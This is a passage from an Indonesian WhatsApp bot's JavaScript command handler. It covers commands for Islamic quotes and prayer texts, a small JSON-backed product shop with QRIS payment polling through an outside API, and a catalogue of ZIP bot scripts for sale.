      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    reply(`${arabic}\n${arti}`)
}
break

case 'bacaansholat': {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    reply(`${contoh} + ${data}`)
}
break

case 'ayatkursi': {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  reply(caption)
}
break

case 'addproduk': {
  if (!isCreator) return reply(mess.owner);
  let input = text.split('|');

  if (input.length < 4) {
    return reply('❌ Masukkan data produk dengan format: kodeproduk|namaproduk|hargaproduk|deskripsiproduk');
  }

  let [kodeproduk, namaproduk, hargaproduk, deskripsiproduk] = input;

  // Pastikan harga adalah angka
  hargaproduk = parseFloat(hargaproduk);

  if (isNaN(hargaproduk)) {
    return reply('❌ Harga harus berupa angka.');
  }

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('1database/dataproduk.json', 'utf8'));

    // Cek apakah kode produk sudah ada
    if (daftarProduk.some(item => item.kodeproduk === kodeproduk)) {
      return reply('❌ Kode produk sudah ada dalam daftar.');
    }

    // Tambahkan produk baru
    let produkBaru = {
      kodeproduk,
      namaproduk,
      hargaproduk,
      deskripsiproduk
    };

    daftarProduk.push(produkBaru);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./storage/database/dataproduk.json', JSON.stringify(daftarProduk, null, 2));
    reply(`✅ Produk berhasil ditambahkan:\nKode: ${kodeproduk}\nNama: ${namaproduk}\nHarga: ${hargaproduk}\nDeskripsi: ${deskripsiproduk}`);
  } catch (error) {
    console.error("Error saat menambahkan produk:", error);
    reply('❌ Terjadi kesalahan saat menambahkan produk.');
  }
}
break;

case 'checkproduk': {
  if (!isCreator) return reply(mess.owner);
  let input = text.trim(); // Hanya mengambil kode produk tanpa pemisah '|'

  if (input.length === 0) {
    return reply('❌ Masukkan kode produk untuk memeriksa produk.');
  }

  let kodeproduk = input;

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./storage/database/dataproduk.json', 'utf8'));

    // Cari produk berdasarkan kode
    let produk = daftarProduk.find(item => item.kodeproduk === kodeproduk);

    if (!produk) {
      return reply('❌ Kode produk tidak ditemukan.');
    }

    // Tampilkan detail produk
    reply(`✅ Informasi produk:\nKode: ${produk.kodeproduk}\nNama: ${produk.namaproduk}\nHarga: ${produk.hargaproduk}\nDeskripsi: ${produk.deskripsiproduk}`);
  } catch (error) {
    console.error("Error saat memeriksa produk:", error);
    reply('❌ Terjadi kesalahan saat memeriksa produk.');
  }
}
break;

case 'delproduk': {
  if (!isCreator) return reply(mess.owner);
  if (!text) return reply('❌ Masukkan kode produk yang ingin dihapus.');

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./storage/database/dataproduk.json', 'utf8'));

    // Cek apakah kode produk ada dalam daftar
    if (!daftarProduk.some(item => item.kodeproduk === text)) {
      return reply('❌ Kode produk tidak ditemukan dalam daftar.');
    }

    // Hapus produk berdasarkan kodeproduk
    daftarProduk = daftarProduk.filter(item => item.kodeproduk !== text);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./storage/database/dataproduk.json', JSON.stringify(daftarProduk, null, 2));
    reply(`✅ Produk dengan kode ${text} berhasil dihapus.`);
  } catch (error) {
    console.error("Error saat menghapus produk:", error);
    reply('❌ Terjadi kesalahan saat menghapus produk.');
  }
}
break;

case 'listproduk': {
  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./storage/database/dataproduk.json', 'utf8'));

    if (daftarProduk.length === 0) {
      return reply('❌ Tidak ada produk yang terdaftar.');
    }

    // Susun daftar produk
    let teks = '📋 *Daftar Produk:*\n\n';
    let buttonRows = []; // Array untuk tombol pemilihan produk

    daftarProduk.forEach((item, i) => {
      teks += `🆔 ${i + 1}. *Kode:* ${item.kodeproduk}\n   🏷️ *Nama:* ${item.namaproduk}\n   💰 *Harga:* ${item.hargaproduk}\n   📄 *Deskripsi:* ${item.deskripsiproduk}\n\n`;

      // Tambahkan item ke dalam tombol pemilihan
      buttonRows.push({
        title: `${item.namaproduk} - ${item.hargaproduk}`,
        id: `.buyproduk ${item.kodeproduk}`
      });
    });

    teks += 'ℹ️ *Cara Membeli:*\n' +
            'Silakan pilih produk yang tersedia dari daftar di bawah atau gunakan perintah manual:\n' +
            '🛒 _*.buyproduk [kodeproduk]*_\n\n' +
            'Contoh: _*.buyproduk ABC123*_\n\n' +
            'Pastikan kode produk sesuai dengan daftar di atas. ✅';

    // Kirim daftar produk dan tombol pemilihan
    await client.sendMessage(m.chat, {
      footer: `© 2025 ${botname}`,
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: 'Pilih Produk untuk Dibeli' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'Pilih Produk yang Tersedia',
              sections: [{ title: 'Produk Tersedia', rows: buttonRows }]
            })
          }
        }
      ],
      headerType: 1,
      viewOnce: true,
      image: fs.readFileSync(`./source/media/Xyz.jpg`),
      caption: teks + "\n\n```Atau Bisa Memilih Langsung Dibawah Ini.```\n"
    }, { quoted: loli });

  } catch (error) {
    console.error("❌ Error saat membaca daftar produk:", error);
    reply('⚠️ Terjadi kesalahan saat membaca daftar produk.');
  }
}
break;

case 'buyproduk': {
  if (m.isGroup) return reply("Pembelian produk hanya bisa dilakukan dalam private chat.");
  if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  let kodeproduk = text.trim();
  if (!kodeproduk) return reply('❌ Masukkan kode produk yang ingin dibeli.');

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./storage/database/dataproduk.json', 'utf8'));

    // Cari produk berdasarkan kodeproduk
    let produk = daftarProduk.find(item => item.kodeproduk === kodeproduk);
    if (!produk) return reply('❌ Kode produk tidak ditemukan dalam daftar.');

    // Proses pembayaran melalui API Order Kuota
    let hargaProduk = parseInt(produk.hargaproduk);
    let uniqueAmount = hargaProduk + generateRandomNumber(110, 250);
    let getPayment = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${uniqueAmount}&codeqr=${global.QrisOrderKuota}`);

    let paymentInfo = getPayment.data.result;
    let teksPembayaran = `
*📌 INFORMASI PEMBAYARAN*

*• ID Transaksi:* ${paymentInfo.transactionId}
*• Total Pembayaran:* Rp${await toIDR(paymentInfo.amount)}
*• Produk:* ${produk.namaproduk}
*• Kode Produk:* ${produk.kodeproduk}
*• Expired:* 5 menit

⚠️ *Note:*  
- Qris pembayaran hanya berlaku dalam 5 menit.  
- Jika melewati batas waktu, pembayaran dianggap tidak valid!  
- Jika pembayaran berhasil, bot akan mengirim notifikasi status transaksi.

Ketik *.batalbeli* untuk membatalkan pembelian.
`;

    let msgQr = await client.sendMessage(m.chat, {
      footer: `© 2025 ${botname}`,
      buttons: [{ buttonId: `.batalbeli`, buttonText: { displayText: 'Batalkan Pembelian' }, type: 1 }],
      headerType: 1,
      viewOnce: true,
      image: { url: paymentInfo.qrImageUrl },
      caption: teksPembayaran,
      contextInfo: { mentionedJid: [m.sender] },
    });

    // Simpan status transaksi ke database
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].pembelian = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: paymentInfo.transactionId,
      amount: paymentInfo.amount.toString(),
      kodeproduk: produk.kodeproduk,
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit) {
            await client.sendMessage(db.users[m.sender].pembelian.chat, { text: "⚠️ Qris pembayaran telah expired!" }, { quoted: db.users[m.sender].pembelian.msg });
            await client.sendMessage(db.users[m.sender].pembelian.chat, { delete: db.users[m.sender].pembelian.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].pembelian;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].pembelian.exp();

    // Cek pembayaran secara berkala
    while (db.users[m.sender].status_deposit) {
      await sleep(8000);
      let resultCek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
      let req = resultCek.data;

      if (req?.amount == db.users[m.sender].pembelian.amount) {
        db.users[m.sender].status_deposit = false;
        delete db.users[m.sender].pembelian;

        await client.sendMessage(m.sender, { text: `
✅ *PEMBAYARAN BERHASIL!*

*• ID Transaksi:* ${paymentInfo.transactionId}
*• Total Pembayaran:* Rp${await toIDR(req.amount)}
*• Produk:* ${produk.namaproduk}
*• Kode Produk:* ${produk.kodeproduk}
`});
      }
    }
  } catch (error) {
    console.error("Error saat memproses pembelian:", error);
    reply('❌ Terjadi kesalahan saat memproses pembelian.');
  }
}
break;
case 'editproduk': {
  if (!isCreator) return reply(mess.owner);
  let input = text.split('|');

  if (input.length < 4) {
    return reply('❌ Masukkan data produk dengan format: kodeproduk|namaproduk|hargaproduk|deskripsiproduk');
  }

  let [kodeproduk, namaproduk, hargaproduk, deskripsiproduk] = input;

  // Pastikan harga adalah angka
  hargaproduk = parseFloat(hargaproduk);

  if (isNaN(hargaproduk)) {
    return reply('❌ Harga harus berupa angka.');
  }

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./storage/database/dataproduk.json', 'utf8'));

    // Cek apakah kode produk ada dalam daftar
    let produkIndex = daftarProduk.findIndex(item => item.kodeproduk === kodeproduk);
    if (produkIndex === -1) {
      return reply('❌ Kode produk tidak ditemukan dalam daftar.');
    }

    // Update data produk
    daftarProduk[produkIndex] = {
      kodeproduk,
      namaproduk,
      hargaproduk,
      deskripsiproduk
    };

    // Simpan kembali ke file JSON
    fs.writeFileSync('./storage/database/dataproduk.json', JSON.stringify(daftarProduk, null, 2));
    reply(`✅ Produk berhasil diperbarui:\nKode: ${kodeproduk}\nNama: ${namaproduk}\nHarga: ${hargaproduk}\nDeskripsi: ${deskripsiproduk}`);
  } catch (error) {
    console.error("Error saat mengedit produk:", error);
    reply('❌ Terjadi kesalahan saat mengedit produk.');
  }
}
break;

case 'listscript': case 'listsc': {
  const scriptPath = './source/database/scripts.json';
  const scriptFolder = './source/media/scripts/';
  try {
      let scriptsData = { scripts: [] };

      try {
          scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));
      } catch (parseError) {
          return reply("❌ *Belum ada script yang tersimpan.*");
      }

      if (!scriptsData.scripts || scriptsData.scripts.length === 0) {
          return reply("❌ *Tidak ada script yang tersedia.*\nTambahkan script dengan cara ketik *.addscript*");
      }

      const formatFileSize = (bytes) => {
          if (bytes < 1024) return `${bytes} B`;
          if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(2)} KB`;
          return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
      };

      let title = `
─━━━━━━━━━━━━━━━━━━━━━✦✧✦━━━━━━━━━━━━━━━━━━━━━─╮
┃               📜 *List Script Simple Bot Shop* 📜
╰─━━━━━━━━━━━━━━━━━━━━━✦✧✦━━━━━━━━━━━━━━━━━━━━━─╯

📋 *Informasi Produk*
✨ *Bot Auto Response 24 Jam*  
✅ *Produk Asli & Terpercaya*  
💳 *Pembayaran Mudah : QRIS*

🔍 *Pilih script yang sesuai kebutuhan Anda!*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

      // Menyiapkan data script
      const scriptRows = scriptsData.scripts.map((script, index) => {
          let fileSize = "Tidak tersedia";
          try {
              const filePath = path.join(scriptFolder, path.basename(script.filePath));
              const size = fs.statSync(filePath).size;
              fileSize = formatFileSize(size);
          } catch (sizeError) {
              console.error('File size error:', sizeError);
          }

          return {
              title: `${index + 1}. ${script.name}`,
              description: `📂 Harga : Rp ${script.price.toLocaleString("id-ID")}\n     📦 Ukuran : ${fileSize}`,
              id: `.belistockscript ${script.name}`
          };
      });

      const buttonData = {
          title: "📜 Daftar List Script Simple Bot Shop",
          sections: [{
              title: "📜 Daftar Script",
              rows: scriptRows
          }]
      };

      const footer = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✨ *Simple Bot Shop - Semua kebutuhan digital Anda!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

      // Menggunakan function sendList
      await client.sendList(m.chat, title, footer, buttonData, { quoted: loli });

  } catch (error) {
      console.error('List Script Error:', error);
      reply("❌ *Gagal menampilkan daftar script.*");
  }
  break;
}

case 'addscript': case 'addsc': {
if (!isCreator) return reply(mess.owner);
const scriptPath = './source/database/scripts.json';
const scriptFolder = './source/media/scripts/';

if (!m.quoted) return reply("❌ *reply Script Yang Akan Ditambahkan!*");

const documentMessage = m.quoted.message?.documentMessage;
if (!documentMessage) return reply("❌ *Mana Script Dokumen nya ka?*");

if (documentMessage.mimetype !== 'application/zip') {
return reply("❌ *File harus berupa ZIP!*");
}

const [name, price, ...descriptionParts] = args;
const description = descriptionParts.join(" ");

if (!name || !price || !description) return reply("❌ *Format salah!*\n📌 Ketik : .addscript NamaScript Harga DeskripsiScript\n\nContoh : .addscript Simple Bot V11 60000 Script multi tergacor yang bisa melakukan banyak hal");

try {
const media = await downloadMediaMessage( m.quoted, 'buffer', {}, { reuploadRequest: client.updateMediaMessage });

if (!media) return reply("❌ *Gagal mendownload file media!*");

const safeFileName = name.replace(/[^a-z0-9]/gi, '_').toLowerCase();
const fileName = `${safeFileName}_${Date.now()}.zip`;
const filePath = path.join(scriptFolder, fileName);

if (!fs.existsSync(scriptFolder)) {
fs.mkdirSync(scriptFolder, { recursive: true });
}
fs.writeFileSync(filePath, media);
let scriptsData = { scripts: [] };
try {
scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));
} catch (parseError) {
console.warn('Could not parse existing scripts database, creating new one');
}
scriptsData.scripts.push({
name: name,
price: parseInt(price),
description: description,
filePath: filePath,
timestamp: Date.now()
});
fs.writeFileSync(scriptPath, JSON.stringify(scriptsData, null, 2));
reply(`✅ *Script berhasil ditambahkan!*\n📜 *Nama*: ${name}\n💰 *Harga*: Rp ${parseInt(price).toLocaleString()}\n📝 *Deskripsi*: ${description}`);
} catch (error) {
console.error('Download Error:', error);
reply(`❌ *Gagal menambahkan script: ${error.message}*`);
}
break;
}

case 'infoscript': case 'infosc': {
const scriptPath = './source/database/scripts.json';

// Validasi argumen
if (!args[0] || isNaN(args[0])) {
return reply("❌ *Berikan nomor script yang valid!*\n_Contoh: .infoscript 1_");
}

const scriptIndex = parseInt(args[0]) - 1;

try {
// Baca database script
let scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));

// Validasi index script
if (scriptIndex < 0 || scriptIndex >= scriptsData.scripts.length) {
return reply("❌ *Nomor script tidak valid!*");
}

// Ambil script yang dipilih
const script = scriptsData.scripts[scriptIndex];

// Buat pesan detail
let detailMessage = "*📜 DETAIL SCRIPT 📜*\n\n";
detailMessage += `*Nama Script*: ${script.name}\n`;
detailMessage += `*Harga*: Rp ${script.price.toLocaleString()}\n`;
detailMessage += `*Deskripsi*: ${script.description}\n`;
detailMessage += `*Ditambahkan*: ${new Date(script.timestamp).toLocaleDateString()}\n\n`;
detailMessage += "_Hubungi owner untuk pembelian_";

// Kirim detail
reply(detailMessage);

} catch (error) {
console.error('Info Script Error:', error);
reply("❌ *Gagal menampilkan detail script.*");
}
break;
}
case 'delscript': case 'delsc': {
if (!isCreator) return reply(mess.owner);
const scriptPath = './source/database/scripts.json';
const scriptFolder = './source/media/scripts/';

// Cek apakah nomor script disediakan
if (!args[0] || isNaN(args[0])) {
return reply("❌ *Berikan nomor script yang valid!*\n_Contoh: .delscript 1_");
}

const scriptIndex = parseInt(args[0]) - 1;

try {
// Baca database scripts
